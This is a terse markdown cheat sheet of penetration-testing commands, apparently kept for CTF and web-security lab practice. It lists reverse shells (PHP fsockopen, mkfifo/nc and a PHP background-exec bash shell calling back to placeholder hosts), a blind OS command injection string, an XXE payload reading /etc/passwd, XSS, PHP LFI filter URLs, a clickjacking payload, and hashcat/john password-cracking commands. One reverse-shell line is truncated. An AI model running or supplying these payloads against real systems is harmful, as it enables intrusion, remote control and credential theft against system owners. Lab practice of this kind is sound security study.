# Hashcat

- hashcat -m 1800 -a 0 hash.txt rockyou.txt

# Find command

```sh
find / -type f -newermt 2016-09-11 ! -newermt 2016-09-13 2>/dev/null
```
# Upgrading to a shell
```sh
python -c 'import pty;pty.spawn('/bin/bash')'
SHELL=/bin/bash script -q /dev/null
```
# Reverse Shell
- php -r '$sock=fsockopen("x.x.x.x",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
- m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.2.97 9001 >/tmp/f

# Blind OS injection

```sh

||whoami>/var/www/images/output.txt||

```

# XXE Attacks

```html
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>

```
# XSS payloads

```html
<script>onclick(alert("Hello"));</script>
// window.location.hostname

```

# John Hashing

```sh

john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
```

# Encryption gpg
- gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] 
- gpg --cipher-algo AES-256 --symetric xyz.txt

## decryption
-- gpg xyz.txt

# How to crack encrypted files using john the ripper
- gpg2john [encrypted gpg file] > [filename of the hash you want to create]

# Reverse a wordlist
```sh
tac data.txt > new_data.txt
```
# Email re
-   email_re = re.compile(r'([a-zA-Z0-9_\+\-\.]+)@(([[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)')

## Php reverse shell function
```php

function execInBackground($cmd) { 
                if (substr(php_uname(), 0, 7) == "Windows"){ 
                                    pclose(popen("start /B ". $cmd, "r"));  
                                                    } 
                                                                    else { 
                                                                                        exec($cmd . " > /dev/null &");   
                                                                                                            } 
                                                                                                                            } 
                                                                                                                                        execInBackground("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_HERE/YOUR_PORT_HERE 0>&1'");

```
# PHP LFI
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

# Practice Labs
Capture the Flag (CTF) API Portal

    docker pull sbacker/ctfapi
    docker run --name ctfapi1 -p 8000:8000 -it -d sbacker/ctfapi

Witcher Portal

    docker pull sbacker/witcherportal
    docker run -it -d --name witcher10 -p8080:8080 -e PYTHONUNBUFFERED=1 sbacker/witcherportal

# Clickjack Attack Payload

```html
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:300px;
       left:60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acbe1f391e8fd65480c7a7ac017500d7.web-security-academy.net/exploit"></iframe>

```
